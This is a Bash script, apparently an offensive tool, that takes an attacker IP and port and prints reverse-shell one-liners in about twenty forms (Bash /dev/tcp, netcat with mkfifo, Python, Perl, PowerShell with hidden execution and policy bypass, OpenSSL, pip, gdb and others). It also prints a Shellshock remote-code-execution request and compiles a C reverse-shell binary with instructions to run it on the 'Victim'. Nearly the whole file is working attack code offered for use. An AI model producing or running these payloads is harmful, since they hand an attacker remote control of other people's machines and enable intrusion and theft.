#!/bin/bash
color_off='\033[0m'

#color
black='\033[0;30m'
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[034m'
purple='\033[0;35m'
cyan='\033[0;36m'
white='\033[0;37m'

#high color
iblack='\033[0;90m'
ired='\033[0;91m'
igreen='\033[0;92m'
iyellow='\033[0;93m'
iblue='\033[0;94m'
ipurple='\033[0;95m'
icyan='\033[0;96m'
iwhite='\033[0;97m'

#dau cong tru

plus="${blue}[${color_off}${green}+${color_off}${blue}]${color_off}"
minus="${blue}[${color_off}${red}-${color_off}${blue}]${color_off}"

Check(){
	command -v lolcat > /dev/null 2>&1 || { echo >&2 "Please install lolcat....";exit 1;}
}

banner(){
	clear
	echo -e "
	 ######
         #     # ###### #    # ###### #####   ####  ######     ####  #    # ###### #      #
         #     # #      #    # #      #    # #      #         #      #    # #      #      #
         ######  #####  #    # #####  #    #  ####  #####      ####  ###### #####  #      #
         #   #   #      #    # #      #####       # #              # #    # #      #      #
         #    #  #       #  #  #      #   #  #    # #         #    # #    # #      #      #
         #     # ######   ##   ###### #    #  ####  ######     ####  #    # ###### ###### ######

	 by ${red}@Hrekcah${color_off}
	" | lolcat
}
Exit(){
 exit
}
menu(){
	echo -e "
	${red}Choose the rv_shell :${color_of}

	[${red}1${color_off}] Bash
	[${blue}2${color_off}] Perl
	[${green}3${color_off}] Ruby
	[${yellow}4${color_off}] Php
	[${purple}5${color_off}] Netcat [nc]
	[${icyan}6${color_off}] Telnet
	[${ired}7${color_off}] Java
	[${igreen}8${color_off}] Lua
	[${iyellow}9${color_off}] Python
	[${ipurple}10${color_off}] Shellshock
	[${icyan}11${color_off}] Powershell
	[${iyellow}12${color_off}] Node
	[${red}13${color_off}] Socat [sc]
	[${iblue}14${color_off}] Openssl
	[${igreen}15${color_off}] Pip
	[${cyan}16${color_off}] Golang
	[${cyan}17${color_off}] Gdb
	[${green}18${color_off}] Ksh
	[${blue}19${color_off}] C
	[${iyellow}20${color_off}] Xterm
	[${ired}21${color_off}] Exit.
	" 
	while true;do
		choose
		read shell 
	case $shell in 
		1) Bash;;
		2) Perl;;
		3) Ruby;;
		4) Php;;
		5) Netcat;;
		6) Telnet;;
		7) Java;;
		8) Lua;;
		9) Python;;				
		10) Shellshock;;			
		11) Powershell;;					
		12) Node;;
		13) Socat;;
		14) Openssl;;
		15) Pip;;
		16) Golang;;
		17) Gdb;;
		18) Ksh;;
		19) C;;
		20) Xterm;;
		21) Exit;;
		*) echo -e "[${red}-${color_off}]Nhap khong dung dinh dang (Enter the number)";banner; menu;;
	esac
done
}
choose(){
	printf "${red}[${color_off}${green}Shell${color_off}${red}] :${color_off} "
}
Bash(){
	sleep 0.5
	echo -e "${plus}${red} Bash TCP : ${color_off}"
	sleep 0.5
	echo -e "${plus}${green} Input${color_off} : "
		echo -e "${minus} bash -i >& /dev/tcp/${red}$your_IP${color_off}/${red}$your_Port${color_off} 0>&1"
	sleep 0.5 
	echo -e "${minus} bash -c \'exec bash -i &>/dev/tcp/${red}$your_IP${color_off}/${red}$your_Port${color_off} <&1\'"
	sleep 0.3
	echo -e "${minus} 0<&39-;exec 39<>/dev/tcp/${red}${your_IP}${color_off}/${red}${your_Port}${color_off};sh <&39 >&39 2>&39"
	echo -e "${plus}${red} Bash UDP : ${color_off}"
	sleep 0.5
	echo -e "${plus}${green} Input :${color_off}
   		sh -i >& /dev/udp/${red}${your_IP}${color_off}/${red}${your_Port}${color_off} 0>&1"
	sleep 0.5
	echo -e "${plus}${red} Output${color_off} : nc -lvp ${red}$your_Port${color_off}"
	sleep 0.5
	echo -e "${plus}${green} Update shell ${color_off}: SHELL=/bin/bash script -q /dev/null
	script /dev/null -c bash"
	sleep 0.5
	echo -e "${plus}${blue} Fully Interactive TTY : ${color_off}"
	echo  "Khi nhận được một shell (when take shell) : "
	echo  "1 : ctrl+z"
	echo  "2 : echo \$TERM (kiểm_tra)"
	echo  "3 : stty -a (kiểm_tra)"
	echo -e "${plus}${red}4${color_off} : stty raw -echo && fg"
	echo "-> reset"
	echo "Nếu nó muốn bạn nhập term thì nhập giống với cái \$TERM"

}
Perl(){
	sleep 1
echo -e "${plus}${blue}Perl : ${color_off}perl -e 'use Socket;\$i=\"${red}$your_IP${color_off}\";\$p=\"${red}$your_Port${color_off}\";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
sleep 0.5
echo -e "${plus}${blue}Perl (Window) : ${color_off} perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"${red}${your_IP}${color_off}:${red}${your_Port}${color_off}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
#echo -e "${plus}${blue}Perl encode (linux) : ${color_off} echo%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew"
sleep 0.5
echo -e "${minus}${red} Ouput :${color_off} nc -lvp ${red}${your_Port}${color_off}"
}
Ruby(){
	sleep 0.5
	echo -e "${green}Ruby : ${color_off}ruby -rsocket -e'f=TCPSocket.open(\"${red}$your_IP${color_off}\",${red}$your_Port${color_off}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' "

	sleep 0.5
	echo -e "${plus}${green}Ruby shell : ${color_off} export RHOST=${red}${your_IP}${color_off} export RPORT=${red}${your_Port}${color_off}
	ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
	sleep 0.5
	echo -e "${green}Ruby shell (no env) : ${color_off} 
	ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"${red}${your_IP}${color_off}\",\"${red}${your_Port}${color_off}\");loop{c.gets.chomp!;(exit! if \$_==\"exit\");(\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen(\$_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{\$_}\"}' "
	sleep 0.5
	echo -e "${green}Ruby shell (Window) : ${color_off}
	ruby -rsocket -e 'c=TCPSocket.new(\"${red}${your_IP}${color_off}\",\"${red}${your_Port}${color_off}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
}
Php(){
	sleep 0.5
	echo -e "${plus}${yellow} Php shell : ${color_off}"
	sleep 0.5
	echo -e  "${plus}${green} Victim : ${color_off} php -r '\$sock=fsockopen(\"${red}$your_IP${color_off}\",${red}$your_Port${color_off});exec(\"/bin/sh -i <&3 >&3 2>&3\");' "
	sleep 0.5
	echo -e "${minus}${red} Hacker : ${color_off} nc -lvp ${red}${your_Port}${color_off}"
}
Netcat(){
	sleep 1
	echo -e  "${purple}Netcat : ${color_off}nc -e /bin/sh ${red}$your_IP $your_Port${color_off} "
	sleep 1
	echo -e  "${purple}Netcat openBsd : ${color_off}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${red}$your_IP $your_Port${color_off} >/tmp/f "
	sleep 0.5
	echo -e "${purple}Netcat Busybox : ${color_off}rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc ${red}$your_IP $your_Port${color_off} >/tmp/f "
	echo -e "${purple}Netcat without -e : ${color_off} nc localhost ${red}${your_Port}${color_off} | /bin/sh | nc localhost ${red}${your_Port}${color_off}"
	echo -e "${purple}UpdateShell : ${color_off}rlwrap nc -lvp ${red}${your_Port}${color_off}"
}
Telnet(){
	sleep 1
	echo -e "${icyan}Telnet reveser : ${color_off}"
	sleep 0.5
	echo -e "[${red}Input${color_off}] : nc -lvp ${red}$your_Port${color_off} "
	sleep 0.5
	echo -e "[${green}Output${color_off}] : telnet ${red}$your_IP $your_Port${color_off} | /bin/bash"
	sleep 1
	echo -e "${icyan}Telnet two reveser : ${color_off}telnet ${red}$your_IP $your_Port${color_off} | /bin/bash | telnet ${red}$your_IP $your_Port${color_off}"
	sleep 0.5
	echo -e " [${red}Input${color_off}] nc -lvp ${red}$your_Port${color_off} "
	sleep 0.5
	echo -e " [${green}Output${color_off}] nc -lvp ${red}$your_Port${color_off} "
	sleep 0.5
	echo -e "${icyan}Telnet (mknod_reverse) : ${color_off}"
	sleep 0.5
	echo -e "[${red}Input${color_off}] :  mknod hacked p;telnet ${red}$your_IP $your_Port${color_off} 0<hacked | /bin/bash 1>hacked"
	sleep 0.5
	echo -e "[${green}Output${color_off}] : nc -lvp ${red}$your_Port${color_off}"
	
}
Java(){
	sleep 0.5
	echo -e "${plus}${yellow} Java shell : ${color_off}"
	sleep 0.5
	echo "r = Runtime.getRuntime()"
	sleep 1
	echo "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/${red}$your_IP${color_off}/${red}$your_Port${color_off};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])"
	sleep 0.5
	echo "p.waitFor()"
}
Lua(){
	sleep 0.5
	echo -e "${plus}${ipurple} Lua shell (Window,Linux) :${color_off} lua5.1 -e 'local host,port = "${red}${your_IP}${color_off}",${red}${your_Port}${color_off} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host,port); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"
	sleep 0.5
	echo -e "${plus}${purple} Lua non-interactive reverse shell : ${color_off}"
	echo -e "${plus}${green} Input${color_off} :
   lua -e 'local s=require(\"socket\");
     local t=assert(s.tcp());
     t:connect(os.getenv(\"${red}${your_IP}${color_off}\"),os.getenv(\"${red}${your_Port}${color_off}\"));
     while true do
     local r,x=t:receive();local f=assert(io.popen(r,\"r\"));
     local b=assert(f:read(\"*a\"));t:send(b);
     end;
     f:close();t:close();'"
     echo -e "${plus}${red} Output${color_off} : nc -lvp $your_Port"

}
Python(){
	sleep 0.5
	echo -e "${plus}${green} Input${color_off} : python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}${your_IP}${color_off}\",${red}${your_Port}${color_off}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
	sleep .20s
	echo -e "${plus}${green} Input${color_off} : python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}${your_IP}${color_off}\",${red}${your_Port}${color_off}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
	sleep .30s
	echo -e "${plus}${green} Input${color_off} : python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}${your_IP}${color_off}\",${red}${your_Port}${color_off}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
	sleep 0.5
	echo -e "${plus}${green} Update shell on hacker ${color_off} : python -c 'import pty; pty.spawn(\"/bin/bash\")'"
	sleep 0.5
	echo -e "${plus}${red} Output${color_off} : socat file:\`tty\`,raw,echo=0 tcp-listen:${red}${your_Port}${color_off}
		nc -lvp ${red}${your_Port}${color_off}"
}

Shellshock(){
	sleep 0.5
	echo -e "${plus}${green} Shellshock [RCE]:${color_off} wget -U \"() { test;};echo \"Content-type: text/plain\"; echo; echo; ${red}YOUR_COMMAND${color_off}\" http://${red}TARGET_IP${color_off}/cgi-bin/status"
	echo
	sleep 0.5
	echo "Developing....."
}

Powershell(){
	sleep 1
	echo -e "${plus}${yellow}Powershell:${color_off} powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"${red}${your_IP}${color_off}\",${red}${your_Port}${color_off});\$stream =\$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback= (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
	sleep 1
	echo -e "${plus}${yellow}Powershell :${color_off} powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('${red}$your_IP${color_off}',${red}$your_Port${color_off});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
	echo -e " ${plus}${yellow}Listener :${color_off}
	${green}# Start listener on port ${red}$your_Port${color_off} :
\$listener = [System.Net.Sockets.TcpListener]${red}${your_Port}${color_off}; \$listener.Start();
 
while(\$true)
{
    \$client = \$listener.AcceptTcpClient();
    Write-Host \$client.client.RemoteEndPoint "connected!";
    \$client.Close();
    start-sleep -seconds 1;
}
	"
}
Node(){
	sleep 1 
	echo -e "${plus}${blue}Node shell :${color_off}"
	sleep 0.5
	echo -e "${plus}${green} Input : ${color_off}${red}export=$your_IP export=$your_Port${color_off}
	node -e 'sh = child_process.spawn(\"/bin/sh\");
     net.connect(process.env.RPORT, process.env.RHOST, function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'"
sleep 0.5
	echo -e "${minus}${red}Output : ${color_off} nc -lvp ${red}${your_Port}${color_off}"
}
Socat(){
	sleep 0.5
	echo -e "${plus}${yellow} Socat shell :${color_off}"
	sleep 0.5
	echo -e "${plus}${green} Input :${color_off} socat tcp-connect:${red}${your_IP}${color_off}:${red}${your_Port}${color_off} exec:/bin/sh,pty,stderr,setsid,sigint,sane"
	sleep 0.5
	echo -e "${minus}${red} Output :${color_off} nc -lvp ${red}$your_Port${color_off}"
}
Openssl(){
	sleep 0.5
	echo -e "${plus}${purple} Openssl shell :${color_off}"
	sleep 0.5
	echo -e "${plus}${green} Victim : ${color_off} 
	mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${red}${your_IP}${color_off}:${red}${your_Port}${color_off} > /tmp/s; rm /tmp/s"
	sleep 0.5
	echo -e "${minus}${red} Hacker : ${color_off}
	openssl req -x509 -newkey rsa:4096 -keyout key.pem -out hack.pem -days 365 -nodes
	openssl s_server -quiet -key key.pem -cert hack.pem -port ${red}${your_Port}${color_off}"
}
Pip(){
	sleep 0.5
	echo -e "${plus}${yellow} Pip shell :${color_off}"
	sleep 0.5
	echo -e "${plus}${green} Victim : ${color_off} export RHOST=${red}${your_IP}${color_off} export RPORT=${red}${your_Port}${color_off} FILE=${red}\$(mktemp -d)${color_off}
	echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(\"/bin/sh\")' > \$FILE/hacked.py
pip install \$FILE"
	sleep 0.5
	echo -e "${minus}${red} Hacker : ${color_off} nc -lvp ${red}${your_Port}${color_off}"

}
Golang(){
	sleep 1
	echo -e "${plus}${cyan} Golang shell :${color_off}
	echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"${red}${your_IP}${color_off}:${red}${your_Port}${color_off}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
}
Gdb(){
	sleep 1
	echo -e "${plus}${blue} Gdb shell :${color_off}"
	sleep 0.5
	echo -e "${plus}${green} Victim :${color_off} export RHOST=${red}${your_IP}${color_off} export RPORT=${red}${your_Port}${color_off}
	gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
        s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))
        [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
         pty.spawn(\"/bin/sh\")' -ex quit"
	 sleep 0.5
	 echo -e "${minus}${red} Hacker : ${color_off} nc -lvp ${red}${your_Port}${color_off}"
}
Ksh(){
	sleep 0.5
	echo -e "${plus}${red} Ksh shell :${color_off}"
	sleep 0.5
	echo -e "${plus}${green} Victim :${color_off}
	ksh -c 'ksh -i > /dev/tcp/${red}${your_IP}${color_off}/${red}${your_Port}${color_off} 2>&1 0>&1'
	"
	sleep 0.5
	echo -e "${minus}${red} Hacker :${color_off} nc -lvp ${red}${your_Port}${color_off}"
}
C(){
	sleep 0.5
	echo -e "${plus}${blue} C shell :${color_off}"
	sleep 1
	echo "
	#include <stdio.h>
        #include <sys/socket.h>
        #include <sys/types.h>
        #include <stdlib.h>
        #include <unistd.h>
        #include <netinet/in.h>
        #include <arpa/inet.h>

  int main(void){
    int port = $your_Port;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(\"$your_IP\");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {\"/bin/sh\", NULL};
    execve(\"/bin/sh\", argv, NULL);

    return 0;       
} " > c.cpp
	gcc c.cpp -o csh
	rm -rf c.cpp
	echo
	sleep 1
   echo -e "         Exit and check ${red}csh${color_off} file, run on ${red}Victim ${color_off} "
}
Xterm(){
	sleep 0.5
	echo -e "${plus}${green} Xterm :${color_off} xterm -display ${red}${your_IP}:${your_Port}${color_off}"
	sleep 0.5
	echo -e "${plus}${green} nc : nc -lvp ${red}${your_Port}${color_off}"
}
Check
your_IP=$1
your_Port=$2
if [[ -z $1 ]] && [[ -z $2 ]];then
	sleep 1
	Check
	exit 1;
	sleep 1
	banner
	echo -e "[${red}-${color_off}] Use : $0 <Ip><Port>"
	exit 1;
else
	banner
	menu
fi
